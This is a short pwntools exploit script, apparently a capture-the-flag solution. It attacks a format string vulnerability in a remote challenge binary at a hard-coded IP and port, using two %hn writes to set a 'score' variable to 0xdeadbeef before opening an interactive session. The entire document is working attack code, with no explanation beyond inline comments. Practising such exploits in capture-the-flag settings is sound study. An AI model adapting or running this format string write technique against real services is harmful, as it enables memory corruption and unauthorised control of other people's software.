from pwn import *

#elf = ELF('./chall')
score_addr = 0x6010ac

#p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])
p = remote('194.31.53.241',1343)
print("=== Exploiting format string vulnerability ===")

# First write: lower 2 bytes of 0xdeadbeef = 0xbeef = 48879
p.recvuntil(b"Enter your format string: ")
payload1 = f"%{48879}c%10$hn".encode().ljust(16, b'A') + p64(score_addr)
print(f"Payload 1 length: {len(payload1)}")
print(f"Writing 0xbeef to {hex(score_addr)}")
p.sendline(payload1)
resp1 = p.recvline()
print("Response 1:", resp1[:100])  # Truncate the long output

# Second write: upper 2 bytes of 0xdeadbeef = 0xdead = 57005  
p.recvuntil(b"Enter your format string: ")
payload2 = f"%{57005}c%10$hn".encode().ljust(16, b'A') + p64(score_addr + 2)
print(f"Payload 2 length: {len(payload2)}")
print(f"Writing 0xdead to {hex(score_addr + 2)}")
p.sendline(payload2)
resp2 = p.recvline()
print("Response 2:", resp2[:100])  # Truncate the long output

p.interactive()
